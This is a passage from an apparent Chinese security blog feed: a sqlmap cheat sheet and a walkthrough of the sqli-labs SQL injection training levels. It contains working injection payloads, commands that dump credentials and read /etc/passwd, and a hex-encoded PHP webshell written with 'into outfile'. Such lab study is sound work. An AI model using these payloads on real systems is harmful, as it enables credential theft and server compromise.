title="注入流程"></a>注入流程</h2><ol><li><p>读取数据库版本，当前用户，当前数据库 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span><br></pre></td></tr></table></figure></li><li><p>判断当前数据库用户权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span><br></pre></td></tr></table></figure></li><li><p>读取所有数据库用户或指定数据库用户的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --<span class="built_in">users</span> --passwords -v 2 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span><br></pre></td></tr></table></figure></li><li><p>获取所有数据库 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span><br></pre></td></tr></table></figure></li><li><p>获取指定数据库中的所有表 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2</span><br></pre></td></tr></table></figure></li><li><p>获取指定数据库名中指定表的字段 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T <span class="built_in">users</span> -v 2</span><br></pre></td></tr></table></figure></li><li><p>获取指定数据库名中指定表中指定字段的数据 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T <span class="built_in">users</span> -C <span class="string">&quot;username,password&quot;</span> -s <span class="string">&quot;sqlnmapdb.log&quot;</span> -v 2 </span><br></pre></td></tr></table></figure></li><li><p>file-read读取web文件 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read <span class="string">&quot;/etc/passwd&quot;</span> -v 2</span><br></pre></td></tr></table></figure></li><li><p>file-write写入文件到web </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file <span class="comment">#使用sqlmap绕过防火墙进行注入测试</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;参数&quot;&gt;&lt;a href=&quot;#参数&quot; class=&quot;headerlink&quot; title=&quot;参数&quot;&gt;&lt;/a&gt;参数&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;-u  #注入点 &lt;/li&gt;
&lt;li&gt;-f  #指纹判别数据库类型 &lt;/li&gt;
&lt;li&gt;-b  #获取数据库版本信息 &lt;/li&gt;</summary>
      
    
    
    
    
    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="sqlmap" scheme="http://example.com/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入靶场sqli-labs</title>
    <link href="http://example.com/2022/04/24/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BAsqli-labs/"/>
    <id>http://example.com/2022/04/24/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BAsqli-labs/</id>
    <published>2022-04-24T06:56:30.000Z</published>
    <updated>2022-05-15T05:54:25.531Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）</p><h2 id="常见的注入点"><a href="#常见的注入点" class="headerlink" title="常见的注入点"></a>常见的注入点</h2><ul><li>GET&#x2F;POST&#x2F;PUT&#x2F;DELETE参数</li><li>X-Forwarded-For</li><li>文件名</li><li>4.1.2.2. Fuzz注入点</li><li>‘ &#x2F; “</li><li>1&#x2F;1</li><li>1&#x2F;0</li><li>and 1&#x3D;1</li><li>“ and “1”&#x3D;”1</li><li>and 1&#x3D;2 </li><li>or 1&#x3D;1</li><li>or 1&#x3D;</li><li>‘ and ‘1’&#x3D;’1</li><li>+ - ^ * % &#x2F;</li><li>&lt;&lt; &gt;&gt; || | &amp; &amp;&amp;</li><li>~</li><li>!</li><li>@</li><li>反引号执行</li></ul><h2 id="4-1-2-3-测试用常量"><a href="#4-1-2-3-测试用常量" class="headerlink" title="4.1.2.3. 测试用常量"></a>4.1.2.3. 测试用常量</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@@version</span><br><span class="line">@@servername</span><br><span class="line">@@language</span><br><span class="line">@@spid</span><br><span class="line">@@database</span><br><span class="line">@@user</span><br><span class="line">@@version_compile_os</span><br></pre></td></tr></table></figure><h2 id="测试列数"><a href="#测试列数" class="headerlink" title="测试列数"></a>测试列数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.xxx.com/index.asp?<span class="built_in">id</span>=12+union+select+null,null--</span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- select 1/0</span><br><span class="line">- select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a</span><br><span class="line">- extractvalue(1, concat(0x5c,(select user())))</span><br><span class="line">- updatexml(0x3a,concat(1,(select user())),1)</span><br><span class="line">- exp(~(SELECT * from(select user())a))</span><br><span class="line">- ST_LatFromGeoHash((select * from(select * from(select user())a)b))</span><br><span class="line">- GTID_SUBSET(version(), 1)</span><br></pre></td></tr></table></figure><h2 id="基于geometric的报错注入"><a href="#基于geometric的报错注入" class="headerlink" title="基于geometric的报错注入"></a>基于geometric的报错注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- GeometryCollection((select * from (select * from(select user())a)b))</span><br><span class="line">- polygon((select * from(select * from(select user())a)b))</span><br><span class="line">- multipoint((select * from(select * from(select user())a)b))</span><br><span class="line">- multilinestring((select * from(select * from(select user())a)b))</span><br><span class="line">- LINESTRING((select * from(select * from(select user())a)b))</span><br><span class="line">- multipolygon((select * from(select * from(select user())a)b))</span><br><span class="line">其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效，具体可以参考这个 commit 95825f 。</span><br><span class="line">而以上列表中基于geometric的报错注入在这个 commit 5caea4 中被修复，在5.5.x较后的版本中同样不再生效。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><ul><li>;select 1</li></ul><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><ul><li>–+</li><li>&#x2F;<em>xxx</em>&#x2F;</li><li>&#x2F;<em>!xxx</em>&#x2F;</li><li>&#x2F;<em>!50000xxx</em>&#x2F;</li></ul><h2 id="判断过滤规则"><a href="#判断过滤规则" class="headerlink" title="判断过滤规则"></a>判断过滤规则</h2><ul><li>是否有trunc</li><li>是否过滤某个字符</li><li>是否过滤关键字</li><li>slash和编码</li></ul><h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><ul><li>判断数据库类型<ul><li>and exists (select * from msysobjects ) &gt; 0 access数据库</li><li>and exists (select * from sysobjects ) &gt; 0 SQLServer数据库</li></ul></li><li>判断数据库表<ul><li>and exsits (select * from admin)</li></ul></li><li>版本、主机名、用户名、库名</li><li>表和字段<ul><li>确定字段数<ul><li>Order By </li><li>Select Into</li></ul></li><li>表名、列名</li></ul></li></ul><h2 id="测试权限"><a href="#测试权限" class="headerlink" title="测试权限"></a>测试权限</h2><ul><li>文件操作</li><li>读敏感文件</li><li>写shell </li><li>带外通道</li><li>网络请求</li></ul><p><a href="https://websec.readthedocs.io/zh/latest/vuln/sql/fuzz.html">原文</a></p><h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><pre><code>基于错误的字符串/数字注入</code></pre><p>判断注入点为数字注入</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>= <span class="number">-1</span></span><br></pre></td></tr></table></figure><p>依次猜解字段数为3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>= 1<span class="string">&#x27; order by  3 --+</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151345546.png?token=ARYCSAQAJQKU4EFI7DF2DP3CQCJ2A"></p><p>联合构造回显位,-1是让前面为假</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>= -1<span class="string">&#x27; union select 1,2,3 --+ </span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151351875.png?token=ARYCSATQIWNB74JBLB7W6H3CQCKTO"></p><p>通过回显位查询用户名和数据库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,user(),database() --+ </span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151350693.png?token=ARYCSAS2JY6N73XIVIQGAULCQCKP4"></p><p>查询所有库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">group_concat 分组</span></span><br><span class="line"><span class="string">schema_name 存储所有库信息的一个字段</span></span><br><span class="line"><span class="string">information_schema 存储所有库信息的一个库</span></span><br><span class="line"><span class="string">information_schema.schemata 存储所有库名的一个表 </span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151352288.png?token=ARYCSASN6T4ZWRHELOIJ4DTCQCKV2"></p><p>查询security数据库的所有表名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;</span>security<span class="string">&#x27;) ,3 --+ </span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151352713.png?token=ARYCSARJLSPH7D5CDHU7C7TCQCKXE"></p><p>查询users表的所有列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name = &#x27;</span><span class="built_in">users</span><span class="string">&#x27;) ,3 --+ </span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151353521.png?token=ARYCSAWGBVK5Z2MZAZKQ2UTCQCKY6"></p><p>查询用户名和密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,(select group_concat(username) from security.users) ,(select group_concat(password) from security.users) --+ </span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151353047.png?token=ARYCSAV4ZAU7YIEL2K2WS2LCQCK2G"></p><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>同 less1,是数值型注入不需要闭合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1 union select 1,(select group_concat(username) from security.users) ,(select group_concat(password) from security.users) </span><br></pre></td></tr></table></figure><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p>需要构造闭合 <code>&#39;)</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;) UNION SELECT 1,(select group_concat(username) from security.users ),database() --+</span></span><br></pre></td></tr></table></figure><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>由 <code>&quot;</code>引起的注入,构造闭合 <code>&quot;)</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot;) UNION SELECT 1,(select group_concat(username) from security.users ),database() --+</span></span><br></pre></td></tr></table></figure><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>源码 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>由 <code>&#39;</code> 引起注入,但是无回显</p><ul><li><p>updatexml </p><ul><li>MySQL 5.1.5版本以上才支持该函数</li><li>返回的数据限制为32位,可以用substring函数进行数据位移偏转</li><li>对XML文档进行修改</li><li>UPDATEXML (XML_document, XPath_string, new_value);</li><li>第一个参数：XML_document是String格式，为XML文档对象的名称</li><li>第二个参数：XPath_string (Xpath格式的字符串)</li><li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li><li>作用：改变文档中符合条件的节点的值</li></ul></li><li><p>写法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from <span class="built_in">test</span> <span class="built_in">where</span> <span class="built_in">id</span>=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure></li><li><p>实例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;  and (updatexml(1,concat(0x7e,(select substring(group_concat(password),1)from users),0x7e),1))--+</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>此处使用 <code>&quot;</code> 闭合,正确返回Use outfile,错误返回You have an error in your SQL syntax</p><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依旧没有回显,闭合符号换成 <code>&#39;))</code>,使用<code>into outfile</code>写入shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;)) union select 1,0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e,3 into outfile &quot;/var/www/html/Less-7/shell.php&quot;--+</span></span><br></pre></td></tr></table></figure><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="comment">//echo &#x27;You are in...........&#x27;;</span></span><br><span class="line">        <span class="comment">//print_r(mysql_error());</span></span><br><span class="line">        <span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>基于布尔的盲注,由 <code>&#39;</code> 引起的注入,正确回显You are in…,错误无回显</p><ul><li>判断数据库长度</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and (length(database())) = 8 --+ #数库名长度=8</span></span><br></pre></td></tr></table></figure><ul><li>逐一猜解库名</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and (ascii(substr((select database()) ,1,1))) = 115--+</span></span><br><span class="line"><span class="string">判断库名的第一个字符是否等于ascii码的115也就是s,等于返回正确页面,不等于返回错误页面</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">逐一猜解...</span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and (ascii(substr((select database()) ,2,1))) = 101 --+</span></span><br></pre></td></tr></table></figure><ul><li><p>判断表长度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 5 --+</span></span><br></pre></td></tr></table></figure></li><li><p>猜解表名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,1,1))) = 117 --+</span></span><br><span class="line"><span class="string">逐一猜解...</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基于时间的盲注,由 <code>&#39;</code> 引起的注入,但是正确和错误都回显一样</p><ul><li><p>判断注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;+and+if(1=1, sleep(5), null)+ --+</span></span><br></pre></td></tr></table></figure></li><li><p>判断库名长度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; + and (length(database())) =8 + and + if(1=1,sleep(5),null) + --+</span></span><br></pre></td></tr></table></figure></li><li><p>逐一猜解表名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; + and (ascii(substr(database(),1,1))) = 115 + and + if(1=1,sleep(3),null) + --+</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p>和less-9一样只是闭合符号换成 <code>&quot;</code></p><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span>(<span 